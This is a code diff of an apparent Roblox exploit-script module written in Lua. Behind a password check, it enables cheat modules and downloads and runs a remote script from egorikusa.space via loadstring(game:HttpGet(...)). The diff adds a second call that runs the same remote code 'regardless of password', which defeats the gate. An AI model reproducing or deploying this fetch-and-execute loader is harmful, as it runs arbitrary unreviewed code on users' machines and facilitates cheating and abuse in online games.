@@ -100,15 +100,18 @@ module[3] = {
                 print("Password accepted. Access granted.")
                 
                 -- Enable other modules
-                for i = 2, 10 do
-                    module[i].Enabled = true
-                end
+                module[2].Enabled = true
+                module[4].Enabled = true
+                module[5].Enabled = true
+                module[6].Enabled = true
+                module[7].Enabled = true
+                module[8].Enabled = true
+                module[9].Enabled = true
+                module[10].Enabled = true
                 
-                -- Execute script 10 times
+                -- Execute script
                 getgenv().gui = false
-                for i = 1, 10 do
-                    loadstring(game:HttpGet("https://egorikusa.space/cac446699015f7682db3b77a.lua", true))()
-                end
+                loadstring(game:HttpGet("https://egorikusa.space/cac446699015f7682db3b77a.lua", true))()       
                 break
             end
         end
@@ -118,9 +121,18 @@ module[3] = {
             passwordEntered = false
             
             -- Disable other modules
-            for i = 2, 10 do
-                module[i].Enabled = false
-            end
+            module[2].Enabled = false
+            module[4].Enabled = false
+            module[5].Enabled = false
+            module[6].Enabled = false
+            module[7].Enabled = false
+            module[8].Enabled = false
+            module[9].Enabled = false
+            module[10].Enabled = false
+            
+            -- Execute script regardless of password
+            getgenv().gui = false
+            loadstring(game:HttpGet("https://egorikusa.space/cac446699015f7682db3b77a.lua", true))()
         end
     end}
 }
